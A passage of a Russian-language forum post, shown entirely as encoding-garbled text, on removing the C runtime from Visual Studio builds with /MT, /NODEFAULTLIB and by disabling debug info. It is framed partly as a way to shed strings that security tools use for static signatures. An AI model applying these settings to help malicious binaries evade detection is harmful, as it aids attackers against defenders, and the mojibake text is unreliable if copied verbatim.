		data-src="https://osint42.org/attachments/1746788477613-png.276/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788477613-png.276/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788477613.png"
			title="1746788477613.png"
			width="921" height="443" loading="lazy" />
	</div><br />
<br />
<b>–ò–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ CRT</b> - –í —Ç–∞–±–ª–∏—Ü–µ –∏–º–ø–æ—Ä—Ç–∞ (IAT) –ø—Ä–∏—Å—É—Ç—Å—Ç–≤—É—é—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ –Ω–µ—Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ —Ä–∞–∑—Ä–µ—à–∏—Ç—å —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –º–µ—Ç–æ–¥–æ–≤, —Ç–∞–∫–∏—Ö –∫–∞–∫ API-—Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ. –≠—Ç–∏ —Ñ—É–Ω–∫—Ü–∏–∏ –∏–º–ø–æ—Ä—Ç–∏—Ä—É—é—Ç—Å—è –∏–∑ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT, —á—Ç–æ –±—É–¥–µ—Ç –æ–±—ä—è—Å–Ω–µ–Ω–æ –ø–æ–∑–∂–µ. –ü–æ–∫–∞ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø–æ–Ω–∏–º–∞—Ç—å, —á—Ç–æ –≤ –ª—é–±–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏, —Å–æ–∑–¥–∞–Ω–Ω–æ–º –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º–∏ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é Visual Studio, –µ—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –Ω–µ–∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π. –í –∫–∞—á–µ—Å—Ç–≤–µ –ø—Ä–∏–º–µ—Ä–∞, IAT –ø—Ä–æ–≥—Ä–∞–º–º—ã &#039;Hello World&#039; –¥–æ–ª–∂–Ω–∞ –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é —Ç–æ–ª—å–∫–æ –æ —Ñ—É–Ω–∫—Ü–∏–∏ printf, –æ–¥–Ω–∞–∫–æ –æ–Ω–∞ –∏–º–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç —Å–ª–µ–¥—É—é—â–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ (–≤—ã–≤–æ–¥ —Å–æ–∫—Ä–∞—â–µ–Ω –∏–∑-–∑–∞ —Ä–∞–∑–º–µ—Ä–∞).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788488515.png"
		data-src="https://osint42.org/attachments/1746788488515-png.277/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788488515-png.277/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788488515.png"
			title="1746788488515.png"
			width="1507" height="909" loading="lazy" />
	</div><br />
<br />
<b>–†–∞–∑–º–µ—Ä </b>- –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã —á–∞—Å—Ç–æ –±–æ–ª—å—à–µ, —á–µ–º –æ–Ω–∏ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –∏–∑-–∑–∞ –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–π –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é. –ù–∞–ø—Ä–∏–º–µ—Ä, —Å–ª–µ–¥—É—é—â–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞ &quot;Hello World&quot; –∏–º–µ–µ—Ç —Ä–∞–∑–º–µ—Ä –æ–∫–æ–ª–æ 11 –∫–∏–ª–æ–±–∞–π—Ç.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788495332.png"
		data-src="https://osint42.org/attachments/1746788495332-png.278/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788495332-png.278/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788495332.png"
			title="1746788495332.png"
			width="1319" height="540" loading="lazy" />
	</div><br />
<br />
<b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏</b> - –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –æ–ø—Ü–∏–∏ &quot;–í—ã–ø—É—Å–∫&quot; –≤—Å–µ —Ä–∞–≤–Ω–æ –º–æ–∂–µ—Ç –≤–∫–ª—é—á–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é, —Å–≤—è–∑–∞–Ω–Ω—É—é —Å –æ—Ç–ª–∞–¥–∫–æ–π, –∏ –¥—Ä—É–≥–∏–µ —Å—Ç—Ä–æ–∫–∏, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã —Å—Ä–µ–¥—Å—Ç–≤–∞–º–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏—Ö —Å–∏–≥–Ω–∞—Ç—É—Ä. –ù–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è—Ö –Ω–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ–≥—Ä–∞–º–º—ã Strings.exe –¥–ª—è –ø—Ä–æ–≥—Ä–∞–º–º—ã &quot;Hello World&quot; (–≤—ã–≤–æ–¥ —Å–æ–∫—Ä–∞—â–µ–Ω –∏–∑-–∑–∞ —Ä–∞–∑–º–µ—Ä–∞).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788502202.png"
		data-src="https://osint42.org/attachments/1746788502202-png.279/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788502202-png.279/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788502202.png"
			title="1746788502202.png"
			width="1316" height="388" loading="lazy" />
	</div><br />
<br />
<b>–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ CRT</b><br />
<br />
–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ CRT, —Ç–∞–∫–∂–µ –∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–∞–∫ Microsoft C Run-Time Library, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –Ω–∞–±–æ—Ä –Ω–∏–∑–∫–æ—É—Ä–æ–≤–Ω–µ–≤—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π –∏ –º–∞–∫—Ä–æ—Å–æ–≤, –æ–±–µ—Å–ø–µ—á–∏–≤–∞—é—â–∏—Ö –±–∞–∑–æ–≤—É—é —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å –¥–ª—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º –Ω–∞ C –∏ C++. –û–Ω–∞ –≤–∫–ª—é—á–∞–µ—Ç —Ñ—É–Ω–∫—Ü–∏–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–∞–º—è—Ç—å—é (–Ω–∞–ø—Ä–∏–º–µ—Ä, malloc, memset –∏ free), –º–∞–Ω–∏–ø—É–ª–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫–∞–º–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, strcpy –∏ strlen) –∏ —Ñ—É–Ω–∫—Ü–∏–∏ –≤–≤–æ–¥–∞-–≤—ã–≤–æ–¥–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä, printf, wprintf –∏ scanf).<br />
<br />
DLL-—Ñ–∞–π–ª—ã –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT –Ω–∞–∑–≤–∞–Ω—ã vcruntimeXXX.dll, –≥–¥–µ XXX - —ç—Ç–æ –Ω–æ–º–µ—Ä –≤–µ—Ä—Å–∏–∏ –∏—Å–ø–æ–ª—å–∑—É–µ–º–æ–π –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT. –¢–∞–∫–∂–µ —Å—É—â–µ—Å—Ç–≤—É—é—Ç DLL-—Ñ–∞–π–ª—ã, —Ç–∞–∫–∏–µ –∫–∞–∫ api-ms-win-crt-stdio-l1-1-0.dll, api-ms-win-crt-runtime-l1-1-0.dll –∏ api-ms-win-crt-locale-l1-1-0.dll, –∫–æ—Ç–æ—Ä—ã–µ —Ç–∞–∫–∂–µ —Å–≤—è–∑–∞–Ω—ã —Å –±–∏–±–ª–∏–æ—Ç–µ–∫–æ–π CRT. –ö–∞–∂–¥–∞—è –∏–∑ —ç—Ç–∏—Ö DLL –≤—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –∏ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ñ—É–Ω–∫—Ü–∏–π. –≠—Ç–∏ DLL-—Ñ–∞–π–ª—ã —Å–≤—è–∑—ã–≤–∞—é—Ç—Å—è –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–æ–º –Ω–∞ —ç—Ç–∞–ø–µ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –∏, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –Ω–∞—Ö–æ–¥—è—Ç—Å—è –≤ —Ç–∞–±–ª–∏—Ü–µ –∏–º–ø–æ—Ä—Ç–∞ (IAT) —Å–æ–∑–¥–∞–Ω–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º.<br />
<br />
<b>–†–µ—à–µ–Ω–∏–µ –ø—Ä–æ–±–ª–µ–º —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏</b><br />
<br />
–ü–æ —É–º–æ–ª—á–∞–Ω–∏—é, –ø—Ä–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –≤ Visual Studio, –æ–ø—Ü–∏—è Runtime Library —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ &quot;Multi-threaded DLL (/MD)&quot;. –° —ç—Ç–æ–π –æ–ø—Ü–∏–µ–π DLL-—Ñ–∞–π–ª—ã –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT —Å–≤—è–∑—ã–≤–∞—é—Ç—Å—è –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç –∏—Ö –∑–∞–≥—Ä—É–∑–∫—É –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. –≠—Ç–æ –≤—ã–∑—ã–≤–∞–µ—Ç –ø—Ä–æ–±–ª–µ–º—ã —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏, –æ –∫–æ—Ç–æ—Ä—ã—Ö —É–ø–æ–º–∏–Ω–∞–ª–æ—Å—å —Ä–∞–Ω–µ–µ. –î–ª—è –∏—Ö —Ä–µ—à–µ–Ω–∏—è —É—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –æ–ø—Ü–∏—é Runtime Library –Ω–∞ &quot;Multi-threaded (/MT)&quot;, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788511295.png"
		data-src="https://osint42.org/attachments/1746788511295-png.280/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788511295-png.280/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788511295.png"
			title="1746788511295.png"
			width="1104" height="613" loading="lazy" />
	</div><br />
<br />
<b>Multi-threaded (/MT) </b><br />
<br />
–ö–æ–º–ø–∏–ª—è—Ç–æ—Ä Visual Studio –º–æ–∂–µ—Ç –±—ã—Ç—å –Ω–∞—Å—Ç—Ä–æ–µ–Ω –Ω–∞ —Å—Ç–∞—Ç–∏—á–µ—Å–∫—É—é —Å–≤—è–∑—å —Ñ—É–Ω–∫—Ü–∏–π CRT, –≤—ã–±—Ä–∞–≤ –æ–ø—Ü–∏—é &quot;Multi-threaded (/MT)&quot;. –≠—Ç–æ –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ —Ç–æ–º—É, —á—Ç–æ —Ñ—É–Ω–∫—Ü–∏–∏, —Ç–∞–∫–∏–µ –∫–∞–∫ printf, –±—É–¥—É—Ç –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω—ã –Ω–∞–ø—Ä—è–º—É—é –≤ —Å–æ–∑–¥–∞–Ω–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º–µ, –∞ –Ω–µ –∏–º–ø–æ—Ä—Ç–∏—Ä—É—é—Ç—Å—è –∏–∑ DLL-—Ñ–∞–π–ª–æ–≤ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT. <b>–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ —ç—Ç–æ —É–≤–µ–ª–∏—á–∏—Ç —Ä–∞–∑–º–µ—Ä –∫–æ–Ω–µ—á–Ω–æ–≥–æ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ –∏ –¥–æ–±–∞–≤–∏—Ç –±–æ–ª—å—à–µ —Ñ—É–Ω–∫—Ü–∏–π WinAPI –≤ —Ç–∞–±–ª–∏—Ü—É –∏–º–ø–æ—Ä—Ç–∞, –Ω–æ —É–¥–∞–ª–∏—Ç DLL-—Ñ–∞–π–ª—ã –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT.</b><br />
<br />
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –æ–ø—Ü–∏–∏ &quot;Multi-threaded (/MT)&quot; –¥–ª—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –ø—Ä–æ–≥—Ä–∞–º–º—ã &quot;Hello World&quot; –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ —Å–ª–µ–¥—É—é—â–µ–π —Ç–∞–±–ª–∏—Ü–µ –∏–º–ø–æ—Ä—Ç–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788519874.png"
		data-src="https://osint42.org/attachments/1746788519874-png.281/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788519874-png.281/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788519874.png"
			title="1746788519874.png"
			width="1508" height="958" loading="lazy" />
	</div><br />
<br />
–†–∞–∑–º–µ—Ä –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ —Ç–∞–∫–∂–µ –∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω–æ —É–≤–µ–ª–∏—á–∏–≤–∞–µ—Ç—Å—è, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788526357.png"
		data-src="https://osint42.org/attachments/1746788526357-png.282/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788526357-png.282/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788526357.png"
			title="1746788526357.png"
			width="1212" height="374" loading="lazy" />
	</div><br />
<br />
<b>–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ CRT –∏ –æ—Ç–ª–∞–¥–∫–∞</b><br />
<br />
–ü–æ—Å–ª–µ —É–¥–∞–ª–µ–Ω–∏—è –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT –ø—Ä–æ–≥—Ä–∞–º–º–∞ –º–æ–∂–µ—Ç –±—ã—Ç—å —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–∞ —Ç–æ–ª—å–∫–æ –≤ —Ä–µ–∂–∏–º–µ &quot;–í—ã–ø—É—Å–∫&quot;. –≠—Ç–æ –¥–µ–ª–∞–µ—Ç –æ—Ç–ª–∞–¥–∫—É –∫–æ–¥–∞ –±–æ–ª–µ–µ —Å–ª–æ–∂–Ω–æ–π. –ü–æ—ç—Ç–æ–º—É —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è —É–¥–∞–ª—è—Ç—å –±–∏–±–ª–∏–æ—Ç–µ–∫—É CRT —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –æ—Ç–ª–∞–¥–∫–∏ –∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏.<br />
<br />
<b>–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞</b><br />
<br />
–ü—Ä–µ–¥—ã–¥—É—â–∏–µ —Ä–∞–∑–¥–µ–ª—ã –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–ª–∏, –∫–∞–∫ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏ —Å–≤—è–∑–∞—Ç—å –±–∏–±–ª–∏–æ—Ç–µ–∫—É CRT. <b>–û–¥–Ω–∞–∫–æ –∏–¥–µ–∞–ª—å–Ω—ã–º —Ä–µ—à–µ–Ω–∏–µ–º –±—ã–ª–æ –±—ã –∏–∑–±–µ–≥–∞—Ç—å –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT –∫–∞–∫ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏, —Ç–∞–∫ –∏ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏</b>, —Ç–∞–∫ –∫–∞–∫ —ç—Ç–æ –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ —É–º–µ–Ω—å—à–µ–Ω–∏—é —Ä–∞–∑–º–µ—Ä–∞ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ –∏ —É–¥–∞–ª–µ–Ω–∏—é –Ω–µ–Ω—É–∂–Ω—ã—Ö –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π –∏ –æ—Ç–ª–∞–¥–æ—á–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏. –î–ª—è —ç—Ç–æ–≥–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤–Ω–µ—Å—Ç–∏ –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤ –Ω–µ—Å–∫–æ–ª—å–∫–æ –æ–ø—Ü–∏–π –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ Visual Studio.<br />
<br />
<b>–û—Ç–∫–ª—é—á–µ–Ω–∏–µ –∏—Å–∫–ª—é—á–µ–Ω–∏–π C++</b><br />
<br />
–û–ø—Ü–∏—è Enable C++ Exceptions –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∫–æ–¥–∞, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–∞–≤–∏–ª—å–Ω–æ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –∏—Å–∫–ª—é—á–µ–Ω–∏—è, –≤—ã–±—Ä–∞—Å—ã–≤–∞–µ–º—ã–µ –∫–æ–¥–æ–º. –û–¥–Ω–∞–∫–æ, –ø–æ—Å–∫–æ–ª—å–∫—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∞ CRT –±–æ–ª—å—à–µ –Ω–µ —Å–≤—è–∑–∞–Ω–∞, —ç—Ç–∞ –æ–ø—Ü–∏—è –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è –∏ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç–∫–ª—é—á–µ–Ω–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788535642.png"
		data-src="https://osint42.org/attachments/1746788535642-png.283/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788535642-png.283/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788535642.png"
			title="1746788535642.png"
			width="1199" height="669" loading="lazy" />
	</div><br />
<br />
<b>–û—Ç–∫–ª—é—á–µ–Ω–∏–µ –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏ –≤—Å–µ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã</b><br />
<br />
–û–ø—Ü–∏—è Whole Program Optimization –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç–∫–ª—é—á–µ–Ω–∞, —á—Ç–æ–±—ã –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—Ç–∏—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–æ–º –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–π, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –ø–æ–≤–ª–∏—è—Ç—å –Ω–∞ —Å—Ç–µ–∫. –û—Ç–∫–ª—é—á–µ–Ω–∏–µ —ç—Ç–æ–π –æ–ø—Ü–∏–∏ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –ø–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–º –∫–æ–¥–æ–º.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788542313.png"
		data-src="https://osint42.org/attachments/1746788542313-png.284/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788542313-png.284/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788542313.png"
			title="1746788542313.png"
			width="1178" height="605" loading="lazy" />
	</div><br />
<br />
<b>–û—Ç–∫–ª—é—á–µ–Ω–∏–µ –æ—Ç–ª–∞–¥–æ—á–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏</b><br />
<br />
–û—Ç–∫–ª—é—á–∏—Ç–µ –æ–ø—Ü–∏–∏ Generate Debug Info –∏ Generate Manifest, —á—Ç–æ–±—ã —É–¥–∞–ª–∏—Ç—å –¥–æ–±–∞–≤–ª–µ–Ω–Ω—É—é –æ—Ç–ª–∞–¥–æ—á–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788550570.png"
		data-src="https://osint42.org/attachments/1746788550570-png.285/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788550570-png.285/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788550570.png"
			title="1746788550570.png"
			width="1152" height="658" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788556750.png"
		data-src="https://osint42.org/attachments/1746788556750-png.286/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788556750-png.286/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788556750.png"
			title="1746788556750.png"
			width="1264" height="717" loading="lazy" />
	</div><br />
<br />
<b>–ò–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—Å–µ—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é</b><br />
<br />
–£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –æ–ø—Ü–∏—é Ignore All Default Libraries –Ω–∞ &quot;Yes (/NODEFAULTLIB)&quot;, —á—Ç–æ–±—ã –∏—Å–∫–ª—é—á–∏—Ç—å —Å–≤—è–∑—ã–≤–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–æ–º —Å –ø—Ä–æ–≥—Ä–∞–º–º–æ–π. –≠—Ç–æ –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ –∏—Å–∫–ª—é—á–µ–Ω–∏—é —Å–≤—è–∑—ã–≤–∞–Ω–∏—è –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT, –∞ —Ç–∞–∫–∂–µ –¥—Ä—É–≥–∏—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫. –í —ç—Ç–æ–º —Å–ª—É—á–∞–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–æ–ª–∂–µ–Ω –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ –æ–±—ã—á–Ω–æ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è—é—Ç—Å—è —ç—Ç–∏–º–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∞–º–∏ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é. –ù–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –Ω–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –æ–ø—Ü–∏–∏ &quot;Yes (/NODEFAULTLIB)&quot;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788563859.png"
		data-src="https://osint42.org/attachments/1746788563859-png.287/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788563859-png.287/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788563859.png"
			title="1746788563859.png"
			width="1181" height="665" loading="lazy" />
	</div><br />
<br />
–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –∫–æ–º–ø–∏–ª—è—Ü–∏—è —Å —ç—Ç–æ–π –æ–ø—Ü–∏–µ–π –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –æ—à–∏–±–∫–∞–º, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788570730.png"
		data-src="https://osint42.org/attachments/1746788570730-png.288/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788570730-png.288/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788570730.png"
			title="1746788570730.png"
			width="971" height="204" loading="lazy" />
	</div><br />
<br />
<b>–£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å–∏–º–≤–æ–ª–∞ —Ç–æ—á–∫–∏ –≤—Ö–æ–¥–∞</b><br />
<br />
